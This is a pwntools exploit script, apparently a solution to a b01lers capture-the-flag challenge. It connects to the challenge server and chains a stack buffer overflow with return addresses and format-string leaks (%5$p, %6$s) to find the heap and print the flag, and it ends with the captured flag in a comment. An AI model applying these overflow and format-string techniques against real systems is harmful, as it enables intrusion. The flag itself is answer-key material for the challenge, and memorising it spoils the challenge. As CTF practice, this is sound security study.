from pwn import *

p = remote("gold.b01le.rs", 4008)
# p = process("./chal")
# pause()

payload  = b'A'*64
payload += p64(0xdeadbeef)
payload += p64(0x40131f)
payload += p64(0xdeadbeef)
payload += p64(0x4012f9)
p.sendlineafter(b'! \n', payload)

p.sendlineafter(b'? ', b'%5$p')
p.recvuntil(b'Ooohh! ')
heap_base   = int(p.recvline()[:-1], 16) - 0x2a0
flag_buffer = heap_base + 0x1490

log.info(f"heap base   = {hex(heap_base)}")
log.info(f"flag buffer = {hex(flag_buffer)}")

payload  = b'A'*64
payload += p64(0xdeadbeef)
payload += p64(0x401216)
payload += p64(0x40131f)
payload += p64(flag_buffer)
p.sendlineafter(b'! \n', payload)

p.sendlineafter(b'? ', b'%6$s')

p.interactive()

# bctf{dr1ving_a_n3w_maser@t1_d0wn_@_d3ad_3nd_str33t_eb30c235cde76705}
